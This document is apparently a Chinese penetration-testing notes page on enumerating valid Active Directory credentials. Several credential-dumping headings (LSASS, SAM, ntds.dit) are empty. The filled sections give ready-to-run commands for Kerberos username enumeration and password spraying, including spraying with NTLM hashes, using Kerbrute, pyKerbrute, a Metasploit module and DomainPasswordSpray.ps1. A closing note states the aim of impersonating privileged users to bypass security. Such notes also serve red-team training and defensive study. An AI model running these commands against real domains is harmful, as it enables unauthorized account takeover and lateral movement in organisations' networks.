---
description: 枚举用户名 + 密码喷洒 = 获取有效凭证 / 枚举出用户名
---

# ✔️ 枚举域内有效凭证

## 先决条件

* 已经在目标域中建立了基本的立足点
* 有足够权限利用域内的查询命令 / 工具

## 获取明文身份凭证

### LAS Secrets





### LSASS Process

*



### LSASS Protection bypass







### Credential Manager





## 获取Hash身份凭证

### 通过SAM数据库获取本地用户Hash凭证





### 通过域控的ntds.dit文件

#### 本地提取



#### 远程提取



## 用户名枚举工具&使用

### Kerbrute

* `userenum`：指定操作为用户名枚举
* `usernames.txt`：包含待枚举用户名的文件（可以是字典，也可以是针对目标域收集到的用户名列表）

```bash
kerbrute userenum -d 目标域名 usernames.txt -dc-ip 域控IP
```

### pyKerbrute

* 和Kerbrute类似（该工具用python写的）
* 用的是：**EnumADUser.py**

```bash
// TCP模式
python EnumADUser.py 域控IP 目标域名 username.txt tcp
// UDP模式
python EnumADUser.py 域控IP 目标域名 username.txt udp
```

### MSF

* 模块：**auxiliary/gather/kerberos\_enumusers**

```bash
use auxiliary/gather/kerberos_enumusers
set domain 目标域名
set RHOSTS 域控IP
set user_file /tem/username.txt
run
```

## 密码喷洒工具&使用

### Kerbrute

* `passwordspray`：指定操作为密码喷洒

```bash
kerbrute passwordspray -d 目标域名 -p 已知的密码 usernames.txt -dc-ip 域控IP
```

### pyKerbrute

* 用的是：**ADPwdSpray.py**

```bash
// 针对明文密码进行喷洒（TCP和UDP模式）
python ADPwdSpray.py 域控IP 目标域名 username.txt clearpassword 已知明文密码 tcp
python ADPwdSpray.py 域控IP 目标域名 username.txt clearpassword 已知明文密码 udp
// 针对密码Hash进行喷洒（TCP和UDP模式）
python ADPwdSpray.py 域控IP 目标域名 username.txt ntlmhash 已获取的密码哈希 tcp
python ADPwdSpray.py 域控IP 目标域名 username.txt ntlmhash 已获取的密码哈希 udp
```

### DomainPasswordSpray.ps1

* 该工具为powershell脚本
* 需要在目标域内机器上执行
* 原理：利用LDAP从域中导出列表->去除被锁定的用户->进行密码喷洒

```powershell
Import-Module.\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 已知的明文密码
```

{% hint style="info" %}
在域渗透的过程中，枚举域内有效凭证的作用是为了收集更多有利于权限提升、横向移动等操作所需要的必要身份验证信息。本质上是为了冒充合法的高权限用户，绕过目标的安全限制，达到访问目标受限资源和进一步扩大攻击面。
{% endhint %}
